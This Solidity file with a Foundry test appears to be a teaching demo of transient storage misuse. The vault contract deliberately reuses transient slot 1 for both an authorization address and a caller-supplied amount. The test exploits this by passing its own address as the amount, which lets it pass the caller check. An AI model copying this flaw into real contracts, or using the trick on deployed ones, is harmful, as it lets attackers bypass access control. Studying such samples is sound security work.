// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SimpleInventoryvault {
    // mint function
    function registerShipment(uint256 amountToStockinventory) external returns (uint256) {
        // Write vault address (address(this)) to transient storage
        address storageVault = address(this);
        assembly {
            tstore(1, storageVault)
        }

        // Directly call own callback function
        this.SwapinventoryCallback(amountToStockinventory, "");

    }

    // Simulate SwapCallback callback function
    function SwapinventoryCallback(uint256 amount ,bytes calldata data) external {
        // Read vault address from transient storage
        address storageVault;
        assembly {
            storageVault := tload(1)
        }

        // Check if caller is a legitimate vault
        require(msg.sender == storageVault, "Not authorized");

        if (storageVault == address(this)) {
            // Output vault address for observation
            console.log("vault address:", storageVault);
            // Write the returned amount to transient storage
            assembly {
                tstore(1, amount)
            }
        } else {
            console.log("Manipulated vault address:", storageVault);
        }
    }

}

contract TransientStorageMisuseTest is Test {
    SimpleInventoryvault storageVault;

    function setUp() public {
        storageVault = new SimpleInventoryvault();
    }

    function testStorageOperation() public {
        // First, let's check what address we want to get
        console.log("Target address:", address(this));

        // Convert the address to uint256
        uint256 amount = uint256(uint160(address(this)));
        emit log_named_uint("Amount needed", amount);

        // Now use this amount in the mint function
        storageVault.registerShipment(amount);

        storageVault.SwapinventoryCallback(0, "");
    }
}